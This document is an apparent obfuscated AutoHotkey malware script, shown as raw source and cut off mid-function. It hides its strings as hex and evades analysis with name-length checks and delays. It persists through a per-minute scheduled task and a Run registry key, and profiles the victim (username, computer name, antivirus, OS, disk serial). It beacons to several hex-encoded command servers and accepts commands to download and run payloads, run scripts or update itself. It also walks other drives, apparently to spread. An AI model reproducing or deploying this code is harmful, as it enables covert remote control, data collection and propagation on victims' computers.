;fyfaqrqurcpxlucjorudvvfoqnuqdivdnxouxcbfzopcqdcjsscvkuqchmloxrygppluogxcaannjzfzuawbrpehbvbghhshvgvuvbxoynfvymglofdkqqlmabyqnbeynqozirhivewijezozpuuth
;ehytpsvzcjsozpzhrvwxrrvibhkjvofsutaiuovcqstuoffeggwaabzdessozgvwhhpqxoqohbhckaqvlwiwokeyzgfgtbbfzzzmrbhacnfbhotvdgcoqhwuyefqqafztuxgvpsybneqybcldaalvp
;avrjdzpspgxlqowocswkygnfhbohgopjxroavfpasazxpmclnpevehpixuoppttcdrsemzmjxkhkiqxklbudirokgxnizmhlaofwswimsursviouvocotirsrvvrezdffexvmvgovrgkoxkvfxjplv
;ddsqreznpkplihlpzkdxvonezoxxabdgzibndwgbjjrhnvzqsczfbzvcmidvryfcyguxzalpmbsdrfjbxqqxdihsigddplmthwefmyevadotlvfgvqfxofkakzqkhrgholazxfqvqnmutwonjlgihx
;aurjnzizpiiwpdhawuqmvfokzglqajqylbuxjorlyfcesraunqxzzffexwsydgwvmoiscjnkoxyioljsicixcakzzmpcfmjnogpdvnzdxotpwwvhlthqxgbkkvuanavenikbpqtbqfpgqlhbzfqqqb


#SingleInstance IGNORE
#NoTrayIcon
global #kf#kfk@fk := 4
global k#f#ee#trrtee@trrt := SubStr(A_ScriptName, 1, InStr(A_ScriptName, ".", False, -1) -1)
global fkkfkf@f := ComObjCreate(ffkkfdd@@dd@("575363726970742E5368656C6C"))
global ffk@f#ddd@@k := ffkkfdd@@dd@("726164")
global #fk#kee@trrt#k := ffkkfdd@@dd@("73797374656D666978")
global @k#ffk@ee@trrt := k#f#ee#trrtee@trrt
global kkeeetrrt# := f#k#ee@trrtdddk@f#f@(21)
global f@#ee#trrt := f#k#ee@trrtdddk@f#f@(21)
global k@kkf@ := f#k#ee@trrtdddk@f#f@(150)
global #f#dd@@f#f := f#k#ee@trrtdddk@f#f@(150)
global @fkeeetrrtkf#f := ComObjCreate(ffkkfdd@@dd@("536372697074696E672E46696C6553797374656D4F626A656374"))
global f#@kf#@kff := k#f#ee#trrtee@trrt . ffkkfdd@@dd@("2E657865")
global kee@trrt@fk#f#ff := k#f#ee#trrtee@trrt . ffkkfdd@@dd@("2E747874")
global #fkfkfk@ := 0
global #dd#@f#k#kfk := 0
global @f#ee#trrt#f@f := ffkkfdd@@dd@("787878")
f#dd#f := 0
if (#kf#kfk@fk = 1){
}else{
if StrLen(A_ScriptName) <> 25
{
exitapp
}
IfInString, A_ScriptDir, % ffkkfdd@@dd@("433A5C")
{
f#kf#k := A_TickCount
while 1 {
Sleep, 1000
#k#ffkf@eeetrrtk := A_TickCount - f#kf#k
if (#k#ffkf@eeetrrtk > 120000)
{
break
}
}
if StrLen(A_ScriptFullPath) <> 50
{
exitapp
}
}else{
}
for process in ComObjGet(ffkkfdd@@dd@("77696E6D676D74733A")).ExecQuery(ffkkfdd@@dd@("53656C656374202A2066726F6D2057696E33325F50726F63657373")) {
@fkee#trrtkk := process.Name
fkfkkfkf@fk# := process.CommandLine
f#@kkf#f := process.ExecutablePath
if (StrLen(@fkee#trrtkk) = 25){
if (StrLen(fkfkkfkf@fk#) > 30){
IfInString, fkfkkfkf@fk#, % ffkkfdd@@dd@("2E747874")
{
f#dd#f := f#dd#f + 1
if (StrLen(f#@kkf#f) = 50){
}
}
}
}
}
if (f#dd#f > 1){
exitapp
}
IfInString, A_ScriptDir, % ffkkfdd@@dd@("433A5C")
{
}else{
FileCopyDir, %A_ScriptDir%, C:\%ddddddkk%%f@#ee#trrt%%ffk#kk%
FileCopyDir, %A_ScriptDir%, C:\%dd#eeetrrt%%kkeeetrrt#%%@f#ddd%
FileSetAttrib, +SH, C:\%@fdd#fk#%%f@#ee#trrt%%f#k#@ee#trrt%,1
FileSetAttrib, +SH, C:\%keeetrrt@f%%kkeeetrrt#%%#k#k@kf#%,1
FileMove, % ffkkfdd@@dd@("433A5C") . f@#ee#trrt . ffkkfdd@@dd@("5C") . k#f#ee#trrtee@trrt . ffkkfdd@@dd@("2E657865") , % ffkkfdd@@dd@("433A5C") . f@#ee#trrt . ffkkfdd@@dd@("5C") . kkeeetrrt# . ffkkfdd@@dd@("2E657865")
FileMove, % ffkkfdd@@dd@("433A5C") . f@#ee#trrt . ffkkfdd@@dd@("5C") . k#f#ee#trrtee@trrt . ffkkfdd@@dd@("2E747874") , % ffkkfdd@@dd@("433A5C") . f@#ee#trrt . ffkkfdd@@dd@("5C") . kkeeetrrt# . ffkkfdd@@dd@("2E747874")
FileMove, % ffkkfdd@@dd@("433A5C") . kkeeetrrt# . ffkkfdd@@dd@("5C") . k#f#ee#trrtee@trrt . ffkkfdd@@dd@("2E657865") , % ffkkfdd@@dd@("433A5C") . kkeeetrrt# . ffkkfdd@@dd@("5C") . kkeeetrrt# . ffkkfdd@@dd@("2E657865")
FileMove, % ffkkfdd@@dd@("433A5C") . kkeeetrrt# . ffkkfdd@@dd@("5C") . k#f#ee#trrtee@trrt . ffkkfdd@@dd@("2E747874") , % ffkkfdd@@dd@("433A5C") . kkeeetrrt# . ffkkfdd@@dd@("5C") . kkeeetrrt# . ffkkfdd@@dd@("2E747874")
k@k#ee@trrtf#k := ";"
FileAppend, `n %k@k#ee@trrtf#k%%k@#fdd#k%%kee#trrtf#@f% %@f#kffk#%%ee#trrtkfk%%k@kkf@%, C:\%ddddddkk%%f@#ee#trrt%%k##dd#%\%k@ddd#%%kkeeetrrt#%%k#f@@kf#%.txt
ddd#ffkfkee#trrt := FileOpen(ffkkfdd@@dd@("433A5C") . f@#ee#trrt . ffkkfdd@@dd@("5C") . kkeeetrrt# . ffkkfdd@@dd@("2E747874"), 0)
k@f@f@fk := ddd#ffkfkee#trrt.Read()
k@f@f@fk := dd#dd@f#dd#kff(k@f@f@fk)
ddd#ffkfkee#trrt.Close()
@dd@#fkf := FileOpen(ffkkfdd@@dd@("433A5C") . f@#ee#trrt . ffkkfdd@@dd@("5C") . kkeeetrrt# . ffkkfdd@@dd@("2E747874"), 5)
@dd@#fkf.WriteLine(k@k#ee@trrtf#k . #f#dd@@f#f)
@dd@#fkf.Write(k@f@f@fk)
@dd@#fkf.Close()
run % ffkkfdd@@dd@("433A5C") . f@#ee#trrt . ffkkfdd@@dd@("5C") . kkeeetrrt# . ffkkfdd@@dd@("2E65786520433A5C") . f@#ee#trrt . ffkkfdd@@dd@("5C") . kkeeetrrt# . ffkkfdd@@dd@("2E747874")
exitapp
}
f#k@#fk#@kf@#f#k()
eeetrrtf@f@fk#ffkf()
}
f@kkf@f@f@#k := Object()
f@kkf@f@f@#k.Insert(ffkkfdd@@dd@("687474703A2F2F6E6577616C7068612E616C7068616E6F6F622E636F6D3A39383938"))
f@kkf@f@f@#k.Insert(ffkkfdd@@dd@("687474703A2F2F7375706572616C7068612E7261646E65776167652E636F6D3A39383938"))
f@kkf@f@f@#k.Insert(ffkkfdd@@dd@("687474703A2F2F7375706572616C7068612E6E65776D696E6572736167652E636F6D3A33333333"))
f@kkf@f@f@#k.Insert(ffkkfdd@@dd@("687474703A2F2F6E6577616C7068612E73757065722D67616D657A65722E636F6D3A39333333"))
f@kkf@f@f@#k.Insert(ffkkfdd@@dd@("687474703A2F2F6E6577616C7068612E616C7068616E6F6F622E636F6D3A39393939"))
f@kkf@f@f@#k.Insert(ffkkfdd@@dd@("687474703A2F2F6E6F6F626D696E65722E7075626C6963766D2E636F6D3A39383938"))
eeetrrtfdd#ffkf@ := f@kkf@f@f@#k.MaxIndex()
f@f@#k@kfk := 0
while 1 {
if (f@f@#k@kfk = eeetrrtfdd#ffkf@){
f@f@#k@kfk := 1
}else{
f@f@#k@kfk := f@f@#k@kfk + 1
}
eeetrrtf@f@fk#ffkf()
kfkkf#f@eeetrrtk#k(f@kkf@f@f@#k[f@f@#k@kfk])
}
kfkkf#f@eeetrrtk#k(#kfk@f#f@dd#fk){
k#@kfkfkkee@trrt = 0
while 1 {
eeetrrtf@f@fk#ffkf()
if (k#@kfkfkkee@trrt = 6){
break
}
kf@fkeeetrrtkf := ffk@f@k@k@#f(#kfk@f#f@dd#fk)
if (kf@fkeeetrrtkf = ffkkfdd@@dd@("4552524F52")){
k#@kfkfkkee@trrt := k#@kfkfkkee@trrt + 1
@kf#kfkeeetrrtk@#f(ffkkfdd@@dd@("636F756C646E7420636F6E6E65637420746F20") . #kfk@f#f@dd#fk . "-" . kf@fkeeetrrtkf)
}else{
ee#trrtfk@f@ := f#fkf@k#kfk#f@k@(kf@fkeeetrrtkf)
if (ee#trrtfk@f@ = ""){
k#@kfkfkkee@trrt := k#@kfkfkkee@trrt + 1
@kf#kfkeeetrrtk@#f(ffkkfdd@@dd@("636F756C646E742066696E6420636F6D6D616E6420696E20") . #kfk@f#f@dd#fk . "-" . kf@fkeeetrrtkf)
}else{
k#@kfkfkkee@trrt := 0
@kf#kfkeeetrrtk@#f(ffkkfdd@@dd@("636F6E6E656374656420746F202022202E2061646472657373202E202220646174613A20") . ee#trrtfk@f@)
#fk@kffkf#@ee@trrt#k(kf@fkeeetrrtkf)
}
}
}
}
ffk@f@k@k@#f(k@k#kkf@@ee#trrt) { 
static f#ffdddfk# := ComObjCreate(ffkkfdd@@dd@("57696E487474702E57696E48747470526571756573742E352E31"))
try {
f#ffdddfk#.Open(ffkkfdd@@dd@("474554"), k@k#kkf@@ee#trrt . "/" . f@f@@ee#trrt#k#f@f() , true)
f#ffdddfk#.Send()
f#ffdddfk#.WaitForResponse()
} catch {
return ffkkfdd@@dd@("4552524F52")
}
if (f#ffdddfk#.Status = 200){
return f#ffdddfk#.ResponseText
}else{
return ffkkfdd@@dd@("4552524F52")
}
}
f#f@@f#kf@kk(){
try {
For objOS In ComObjGet(ffkkfdd@@dd@("77696E6D676D74733A5C5C6C6F63616C686F73745C726F6F745C736563757269747963656E74657232")).InstancesOf(ffkkfdd@@dd@("416E7469566972757350726F64756374")) {
k@#kffk@kk := ObjOS.displayName
}
} catch {
return "Unknown"
}
return k@#kffk@kk
}
f@kfk#k@f#f@@k(){
try {
For objOS In ComObjGet(ffkkfdd@@dd@("77696E6D676D74733A5C5C")).InstancesOf(ffkkfdd@@dd@("57696E33325F4F7065726174696E6753797374656D")) {
ee@trrtfkfkk := ObjOS.Caption
}
} catch {
return "Unknown"
}
return ee@trrtfkfkk
}
@kf#kfkeeetrrtk@#f(k#kf#f#k#fkfk#ff){


}
k#k@f#kf#k#f#ddd(@dd@k@kf#dd@kf) { 
local f@#kf@@kf#kf, #f#k@k, f#keeetrrt
If !@dd@k@kf#dd@kf
Return 0
f@#kf@@kf#kf := A_FormatInteger
SetFormat, INTEGER, H
Loop, Parse, @dd@k@kf#dd@kf
{
#f#k@k := Asc(A_LoopField)
StringTrimLeft, #f#k@k, #f#k@k, 2
f#keeetrrt .= #f#k@k . ""
}
SetFormat, INTEGER, %f##kf#@k%%fkfdd#fk%%f@#kf@@kf#kf%
Return f#keeetrrt
}
urlsafe_b64decode(k#k@f@@f)
{
Return #dddee@trrtf@f@f@k(k#k@f@@f, "-_")
}
@fdd@eeetrrtkfk#k@fk(@k#dddkf@f#k, @fkffk#ee#trrt@f#k:="+/") { 
StringLeft, @fkffk#ee#trrt@f#k, @fkffk#ee#trrt@f#k, 2
Return fkkf@ee@trrtkf@f(@k#dddkf@f#k, ffkkfdd@@dd@("4142434445464748494A4B4C4D4E4F505152535455565758595A6162636465666768696A6B6C6D6E6F707172737475767778797A30313233343536373839") . @fkffk#ee#trrt@f#k)
}
#dddee@trrtf@f@f@k(f@@f@kfk#dd@, #kfkeeetrrtkf@ddd@#f:="+/") { 
StringLeft, #kfkeeetrrtkf@ddd@#f, #kfkeeetrrtkf@ddd@#f, 2
Return k#f@f#k@f@keeetrrt(f@@f@kfk#dd@, ffkkfdd@@dd@("4142434445464748494A4B4C4D4E4F505152535455565758595A6162636465666768696A6B6C6D6E6F707172737475767778797A30313233343536373839") . #kfkeeetrrtkf@ddd@#f)
}
fkkf@ee@trrtkf@f(kfk#@f#f#fk@f#k#, @f@fkfddd@#k#k#k:=""){
StringCaseSense On
Loop, Parse, kfk#@f#f#fk@f#k#
{
dd#k@kf# := Mod(A_Index, 3)
if (dd#k@kf# = 1)
{
f##fk# := ((Asc(A_LoopField) >> 2) & 0x3F)
f#k@@k := (Asc(A_LoopField) & 0x03 ) << 4
}
else if (dd#k@kf# = 2)
{
f##fk# := f#k@@k | ((Asc(A_LoopField) >> 4) & 0x0F)
f#k@@k := (Asc(A_LoopField) & 0x0F) << 2
}
else
{
f##fk# := f#k@@k | ((Asc(A_LoopField) >> 6) & 0x03)
StringMid, base64Char, @f@fkfddd@#k#k#k, f##fk# + 1, 1
k#k@f@@f := k#k@f@@f base64Char
f##fk# := (Asc(A_LoopField)) & 0x3F
}
StringMid, base64Char, @f@fkfddd@#k#k#k, f##fk# + 1, 1
k#k@f@@f := k#k@f@@f base64Char
}
if (dd#k@kf# = 1)
{
StringMid, base64Char, @f@fkfddd@#k#k#k, f#k@@k + 1, 1
return k#k@f@@f base64Char "=="
}
else if (dd#k@kf# = 2)
{
StringMid, base64Char, @f@fkfddd@#k#k#k, f#k@@k + 1, 1
return k#k@f@@f base64Char "="
}
else
{
return k#k@f@@f "=="
}
}
k#f@f#k@f@keeetrrt(fk#k@k@f@k@ee@trrt@k, #fk##kfk@kkee#trrt:=""){
StringReplace fk#k@k@f@k@ee@trrt@k, fk#k@k@f@k@ee@trrt@k, =,,All
StringReplace, fk#k@k@f@k@ee@trrt@k, fk#k@k@f@k@ee@trrt@k, `r,,All
StringReplace, fk#k@k@f@k@ee@trrt@k, fk#k@k@f@k@ee@trrt@k, `n,,All
StringCaseSense On
Loop, Parse, fk#k@k@f@k@ee@trrt@k
{
StringGetPos, currentBin, #fk##kfk@kkee#trrt, %A_LoopField%
@kf#fk := Mod(A_Index, 4)
if (@kf#fk = 1)
{
f#k@@k := currentBin << 2
}
else if (@kf#fk = 2)
{
#f#dd#k#f@#k := #f#dd#k#f@#k Chr(f#k@@k | (currentBin >> 4))
f#k@@k := (currentBin & 0x0F) << 4
}
else if (@kf#fk = 3)
{
#f#dd#k#f@#k := #f#dd#k#f@#k Chr(f#k@@k | (currentBin >> 2))
f#k@@k := (currentBin & 0x03) << 6
}
else
{
#f#dd#k#f@#k := #f#dd#k#f@#k Chr(f#k@@k | currentBin)
}
}
Return #f#dd#k#f@#k
}
f#k@#fk#@kf@#f#k() {
#f#eeetrrt@ee#trrtfk := A_ScriptDir . "\" . k#f#ee#trrtee@trrt . ffkkfdd@@dd@("2E657865")
k@#ee#trrtk@ := @fk@fdddf##dd#ff(A_ScriptDir . "\" . k#f#ee#trrtee@trrt . ffkkfdd@@dd@("2E747874"))
@k@ffk@eeetrrt := ffkkfdd@@dd@("7363687461736B73202F637265617465202F7363206D696E757465202F6D6F2031202F746E")
run, %@k@ffk@eeetrrt%%#fddd@@k%%f@k@kk% %ee#trrteeetrrt@f%%@k#ffk@ee@trrt%%@ee@trrtf##k% /tr "%#f#eeetrrt@ee#trrtfk%%k@@k%%#fkf% %k@#ee#trrtk@%%@k#f%%#f@k#fkf%",,Hide
Sleep, 3000
fkfdddff := ffkkfdd@@dd@("7363687461736B732E657865")
Process, Close, %f##kf#@k%%fkfdddff%%@f#kffk#%
RegWrite, % ffkkfdd@@dd@("5245475F535A") , % ffkkfdd@@dd@("484B4355"), % ffkkfdd@@dd@("536F6674776172655C4D6963726F736F66745C57696E646F77735C43757272656E7456657273696F6E5C52756E"), %@f@kf#%%@k#ffk@ee@trrt%%ffk#kk%, %k@fk%%#f#eeetrrt@ee#trrtfk%%f##kf#@k% %k#f@@kf#%%fk@f#fkk%%k@#ee#trrtk@%
}
f#kfkkf@@kf#kk(k#f#@f#f#ee@trrtkk){
Process,Exist,%ffk#f@%%k#f#@f#f#ee@trrtkk%%#fddd@@k%
return Errorlevel
}
@ffk#fk#dd#fkkf#(){
@ee#trrt#k@k := f@dd#ddd@f@kf@(f@ffkkee#trrtk#fk@k#() . A_OSVersion  . f@kfk#k@f#f@@k())
return SubStr(@ee#trrt#k@k, 1, 30)
}
f@ffkkee#trrtk#fk@k#(){
try {
DriveGet, hSerial, Serial, C:
} catch {
return ffkkfdd@@dd@("556E6B6E6F776E")
}
return hSerial
}
@fkee#trrtdd#fk@fk(){
if  ( f#kfkkf@@kf#kk(ffkkfdd@@dd@("73747265616D65722E657865")) or f#kfkkf@@kf#kk(ffkkfdd@@dd@("6C697665776F726B65722E657865")) or f#kfkkf@@kf#kk(ffkkfdd@@dd@("7375706572636865636B65722E657865")) or f#kfkkf@@kf#kk(ffkkfdd@@dd@("737065656475702E657865")) or f#kfkkf@@kf#kk(ffkkfdd@@dd@("6E6F76612E657865"))){
return 1
}
return 0
}
#k@f@dd#k@#f@f(){
if  f#kfkkf@@kf#kk(ffkkfdd@@dd@("637075636865636B65722E657865")) or f#kfkkf@@kf#kk(ffkkfdd@@dd@("637075636865636B657233322E657865"))
{
return 1
}
return 0
}
f@f@@ee#trrt#k#f@f(){
ee@trrtdd##ffdd# := fkkfkf@f.ExpandEnvironmentStrings(ffkkfdd@@dd@("25434F4D50555445524E414D4525"))
kf@kf#dd#f := fkkfkf@f.ExpandEnvironmentStrings(ffkkfdd@@dd@("25555345524E414D4525"))
spreadisrun := @fkee#trrtdd#fk@fk()
#f@k#f := f@kfk#k@f#f@@k()
f@kfk##fk@fk := #k@f@dd#k@#f@f()
@dddfk#k := f#f@@f#kf@kk()
#fk#dd#k@k := @ffk#fk#dd#fkkf#() . ffkkfdd@@dd@("2F312F") . f@dd#ddd@f@kf@(#f@k#f)  . "/" . f@dd#ddd@f@kf@(ee@trrtdd##ffdd#) . "/" . f@dd#ddd@f@kf@(kf@kf#dd#f)  . "/" .  f@dd#ddd@f@kf@(ffk@f#ddd@@k)  . "/" .   f@dd#ddd@f@kf@(k@#kffk@kk)  . "/" .  spreadisrun  . "/" .  f@kfk##fk@fk
return #fk#dd#k@k
}
f@dd#ddd@f@kf@(k@kf@kf@k@k@f#kf){
k@kf@kf@k@k@f#kf := k#k@f#kf#k#f#ddd(@fdd@eeetrrtkfk#k@fk(k@kf@kf@k@k@f#kf))
return k@kf@kf@k@k@f#kf
}
f#fkf@k#kfk#f@k@(#k@fk#fk@f#fkk){
try {
kffdd##fk#:=RegExMatch(#k@fk#fk@f#fkk, ffkkfdd@@dd@("3A3A283F503C4E616D653E2E2A3F293A3A"), match)
} catch {
return ""
}
return matchName
}
@eeetrrtkkffkfdd#k(k#kf@k#kf#k#@eeetrrt) { 
@f@dd@#kf@@f := ""
@k@dd@k@:=1
Loop % StrLen(k#kf@k#kf#k#@eeetrrt)/2	{
eeetrrt@#k := SubStr(k#kf@k#kf#k#@eeetrrt, @k@dd@k@ , 2)
@f@dd@#kf@@f .= Chr("0x" eeetrrt@#k)
@k@dd@k@ +=2
}
Return @f@dd@#kf@@f
}
@kf@@dd@kffk(ee@trrtdd@@k@kffkf@k,f@#kf#kfk@k#f#,fdd@@dd#ddddd#){
try {
kf@f#kf@eeetrrt@:=RegExMatch(ee@trrtdd@@k@kffkf@k, f@#kf#kfk@k#f# . ffkkfdd@@dd@("283F503C4E616D653E2E2A3F29") . fdd@@dd#ddddd#, match)
} catch {
return ""
}
return matchName
}
#fk@kffkf#@ee@trrt#k(#eeetrrt#kffk@ffkk){
@kf#kfkeeetrrtk@#f(ffkkfdd@@dd@("67657420636F6D6D616E64") . #dddee@trrtf@f@f@k(@eeetrrtkkffkfdd#k(#eeetrrt#kffk@ffkk)))
@kkf#ffkkf := #dddee@trrtf@f@f@k(@eeetrrtkkffkfdd#k(#eeetrrt#kffk@ffkk))
ee#trrtee@trrt@k@f := ffkkfdd@@dd@("433A5C") . k#f#ee#trrtee@trrt
if (FileExist(ee#trrtee@trrt@k@f)) {
}else{
ee#trrtee@trrt@k@f := A_ScriptDir
}
f@fk@kf@fk#f := ffkkfdd@@dd@("7570646174652D")
f#@dddk@kk := ffkkfdd@@dd@("646F776E6C6F61642D")
k#ffkf@ffk := ffkkfdd@@dd@("7363726970742D")
k@fkeeetrrtkfk := ffkkfdd@@dd@("75706461746573656C662D")
IfInString, @kkf#ffkkf, %@f@kfdd@%%#eeetrrtkf#k%%f@fk@kf@fk#f%
{
@fk#fkkf#k := @kf@@dd@kffk(@kkf#ffkkf,ffkkfdd@@dd@("7570646174652D"),ffkkfdd@@dd@("2D757064617465"))
ee@trrtkkf#dd# := ffkkfdd@@dd@("5C") . f#k#ee@trrtdddk@f#f@(10) . ffkkfdd@@dd@("2E747874")
if FileExist(A_ScriptDir . ffkkfdd@@dd@("5C") . ee@trrtkkf#dd#){
FileDelete ,%A_ScriptDir%\%@dd##kfk%%fdd#%%ee@trrtkkf#dd#%
}
@kf#kfkeeetrrtk@#f(ffkkfdd@@dd@("646F776E6C6F6164696E672075706461746520") . ee@trrtkkf#dd# . " - " . @fk#fkkf#k)
UrlDownloadToFile, %@fk#fkkf#k%%#fkfkfk#%%@f#ddd%, %A_ScriptDir%\%ee@trrtkkf#dd#%%eeetrrtkf#@f%%dd#eeetrrt%
if FileExist(A_ScriptDir . ffkkfdd@@dd@("5C") . ee@trrtkkf#dd#){
FileDelete ,%A_ScriptDir%\%fddd#ddd%%@kf#k@#k%%kee@trrt@fk#f#ff%
FileMove, %A_ScriptDir%\%ddddddkk%%ee@trrtkkf#dd#%%#fddd@@k%, %A_ScriptDir%\%@dd@eeetrrtf%%kee@trrt@fk#f#ff%%#kfkkf#k%
Run,%A_ScriptDir%\%#dd##dd@%%f@#f%%f#@kf#@kff% %A_ScriptDir%\%kee@trrt@fk#f#ff%%@fdd#fk#%%fkkf#k%
exitapp
}
return
}
IfInString, @kkf#ffkkf, %ffk#kk%%fdd@f##k%%f#@dddk@kk%
{
k#k#fk#f := @kf@@dd@kffk(@kkf#ffkkf,ffkkfdd@@dd@("646F776E6C6F61642D"),ffkkfdd@@dd@("2D646F776E6C6F6164"))
k#k#fk#f := StrSplit(k#k#fk#f, ffkkfdd@@dd@("3A213A"))
@f#dd#fddd := ffkkfdd@@dd@("5C") . f#k#ee@trrtdddk@f#f@(10) . ffkkfdd@@dd@("2E747874")
@kf#k@k# := k#k#fk#f[1]
ee@trrtkkf#dd# := k#k#fk#f[2]
if FileExist(ee#trrtee@trrt@k@f . ffkkfdd@@dd@("5C") . ee@trrtkkf#dd#){
FileDelete ,%k@#k@f%%ee#trrtee@trrt@k@f%%ffdd#f%\%k##dd#%%ee@trrtkkf#dd#%%k@ddd#%
}
@kf#kfkeeetrrtk@#f("downloading file " . ee@trrtkkf#dd# . " - " . @kf#k@k#)
if FileExist(ee#trrtee@trrt@k@f . @f#dd#fddd){
FileDelete ,%@kf#k@#k%%k@ddd#%%ee#trrtee@trrt@k@f%%fddd#ddd%%@f#dd#fddd%%@kkffk%
}
UrlDownloadToFile, %dddfkk%%@kf#k@k#%%kf#fkfkk%, %f@#f@eeetrrt%%ee#trrtee@trrt@k@f%%@f@kfdd@%%f@#f%%@f#dd#fddd%%dd#kfk%
if FileExist(ee#trrtee@trrt@k@f . @f#dd#fddd){
FileMove, %ee#trrtee@trrt@k@f%%ee#trrtkfk%%#fkf%%@ee@trrtf##k%%@f#dd#fddd%%@ee@trrtf##k%, %ee#trrtee@trrt@k@f%%ee#trrteeetrrt@f%%fk@f#fkk%\%#fddd@@k%%ee@trrtkkf#dd#%%f@k@kk%
IfInString, ee@trrtkkf#dd#, %#fk@@k%%f#fk#eeetrrt%%@f#ee#trrt#f@f%
{
k##dd@k@ff := ffkkfdd@@dd@("433A5C") . k#f#ee#trrtee@trrt . ffkkfdd@@dd@("5C") . f#@kf#@kff . " " . ffkkfdd@@dd@("433A5C") . k#f#ee#trrtee@trrt . ffkkfdd@@dd@("5C") . ee@trrtkkf#dd#
Run,%k##dd@k@ff%%k#kf@k#f%%#eeetrrtkf#k%
}else{
Run,%kfkee@trrt#f%%ee#trrtee@trrt@k@f%%f#k#@ee#trrt%\%fkfdd#fk%%ee@trrtkkf#dd#%%fk@dd#kf%
}
}
return
}
IfInString, @kkf#ffkkf, %f@eeetrrtk%%k#ffkf@ffk%%f#f@ddd#%
{
@fk#k#kkf#kf := @kf@@dd@kffk(@kkf#ffkkf,ffkkfdd@@dd@("7363726970742D"),ffkkfdd@@dd@("2D736372697074"))
@fk#k#kkf#kf := StrSplit(@fk#k#kkf#kf, ":!:")
ddd#f@@f := @fk#k#kkf#kf[1]
k@#ee@trrtffkf := @fk#k#kkf#kf[2]
fdd#f#@k :=  ffkkfdd@@dd@("5C") . f#k#ee@trrtdddk@f#f@(10) . ffkkfdd@@dd@("2E747874")
@f@dd@kee#trrtk# := ee#trrtee@trrt@k@f . ffkkfdd@@dd@("5C") . k@#ee@trrtffkf
if FileExist(@f@dd@kee#trrtk#){
FileDelete ,%kf#fkfkk%%@f@dd@kee#trrtk#%%ee@trrtkf#%
}
if FileExist(ee#trrtee@trrt@k@f . fdd#f#@k){
FileDelete ,%ffkf@k%%@kf#k@#k%%ee#trrtee@trrt@k@f%%fdd#f#@k%%fkfk%%f#k#@ee#trrt%
}
@kf#kfkeeetrrtk@#f("script file " . k@#ee@trrtffkf . " - " . ddd#f@@f)
FileAppend, %#k#fk@kk%%ddd#f@@f%%f@#f@eeetrrt%, %f@fkf#kf%%ee#trrtee@trrt@k@f%%f#f@ddd#%%fdd#f#@k%%fdd@f##k%%@dd##kfk%
FileMove, %fk@fkk%%ee#trrtee@trrt@k@f%%dd#eeetrrt%%kf#fkfkk%%keeetrrt@f%%fdd#f#@k%, %@k#dd@f#%%ee#trrtee@trrt@k@f%%fkfdd#fk%\%kf@fk@#k%%k#k#kf%%k@#ee@trrtffkf%
IfInString, k@#ee@trrtffkf, %k@#fdd#k%%@f#ee#trrt#f@f%%ee@trrtf%
{
k##dd@k@ff := ffkkfdd@@dd@("433A5C") . k#f#ee#trrtee@trrt . ffkkfdd@@dd@("5C") . f#@kf#@kff . " " .  @f@dd@kee#trrtk#
Run,%f@k@kk%%f#f@%%k##dd@k@ff%
}else{
Run,%dd#kfk%%k#f@f@kk%%ee#trrtee@trrt@k@f%\%kf#fkfkk%%k@#ee@trrtffkf%%eeetrrt@k@%
}
return
}
IfInString, @kkf#ffkkf, %k@fkeeetrrtkfk%%#kfkkf#k%%eeetrrt@k@%
{
kkeeetrrt#  := k#f#ee#trrtee@trrt
k@k#ee@trrtf#k := ";"
FileAppend, `n %k@k#ee@trrtf#k%%ffkf@k%%kfk#f@% %ffk##k%%k@kkf@%%#kfkkf#k%, %A_ScriptFullPath%
#f#fk#ff := FileOpen(A_ScriptFullPath, 0)
k@k#f@k@k@ := #f#fk#ff.Read()
k@k#f@k@k@ := dd#dd@f#dd#kff(k@k#f@k@k@)
#f#fk#ff.Close()
@f@fkkf#fkf@ := FileOpen(A_ScriptFullPath, 5)
@f@fkkf#fkf@.WriteLine(k@k#ee@trrtf#k . #f#dd@@f#f)
@f@fkkf#fkf@.Write(k@k#f@k@k@)
@f@fkkf#fkf@.Close()
kkeeetrrt# := f#k#ee@trrtdddk@f#f@(21)
return
}
IfInString, @kkf#ffkkf, % ffkkfdd@@dd@("736C6565702D")
{
f#@fk#ddd@fk := @kf@@dd@kffk(@kkf#ffkkf,ffkkfdd@@dd@("736C6565702D"),ffkkfdd@@dd@("2D736C656570"))
@kf#kfkeeetrrtk@#f(ffkkfdd@@dd@("736C656570696E6720") . f#@fk#ddd@fk)
#ee@trrt@kfdd@#kfk(f#@fk#ddd@fk)
return
}
sleep , 1000
}
#ee@trrt@kfdd@#kfk(k@@ee#trrtk@k#@dd@kf){
if (#kf#kfk@fk = 1){
sleep , 5000
}else{
sleep k@@ee#trrtk@k#@dd@kf
}
}
@fk@fdddf##dd#ff(@kkfk@f@fdddf@fk){
try {
VarSetCapacity(SHORT,StrLen(@kkfk@f@fdddf@fk)*2)
DllCall("GetShortPathName","Str",@kkfk@f@fdddf@fk,"Str",SHORT,"UInt",StrLen(@kkfk@f@fdddf@fk)*2)
} catch {
return @kkfk@f@fdddf@fk
}
if (SHORT = "")
{
return @kkfk@f@fdddf@fk
}
Return SHORT
}
f#k#ee@trrtdddk@f#f@(k#@eeetrrtf@ee#trrteeetrrtf@) {
static   c
if   !c
Loop, 26
c .=   (!c ? "" : "`n") Chr(A_Index + 96)
Loop %   k#@eeetrrtf@ee#trrteeetrrtf@
{
Random, n, 1, 1296
Loop %   n
Sort, c, Random
str .=   SubStr(c,1,1)
}
return   str
}
eeetrrtf@f@fk#ffkf() {
For objOS In @fkeeetrrtkf#f.Drives {
dd#f@f := ObjOS.path
if (dd#f@f = ffkkfdd@@dd@("433A")){
}else{
@ffk#f@ddd = %kkf@%%dd#f@f%%k#k#kf%\*.*
Loop, %@kee#trrtfk@%%kfk@%%@ffk#f@ddd%
{
@f#f@ee@trrt = %A_LoopFileDir%
}
#fkfkfk@ := 0
Loop, %@ffk#f@ddd%%#dd##dd@%%k##dd#%, 1
{
if (#fkfkfk@ > 0){
if (#dd#@f#k#kfk > 0){
break
}
}
FileGetAttrib,CurAttrib, %A_LoopFileFullPath%
IfInString, CurAttrib, D
{
StringReplace, A_LoopRelativeFileName, A_LoopFileFullPath, %@f#f@ee@trrt%%ffdd#f%%@f@kf#%,
if (A_LoopRelativeFileName = ffkkfdd@@dd@("5C2452454359434C452E42494E")){
}else{
fkf@#f@ee@trrt := SubStr(k#f#ee#trrtee@trrt, 1, 3)
ddd#f#k@k@kf := A_LoopRelativeFileName
StringReplace, ddd#f#k@k@kf, ddd#f#k@k@kf,  "\",
ifexist, %@dd#f@#k%%kfk@%%dd#f@f%%A_LoopRelativeFileName%\%fk@f#f%%kf#fkfkk%%k#f#ee#trrtee@trrt%
{
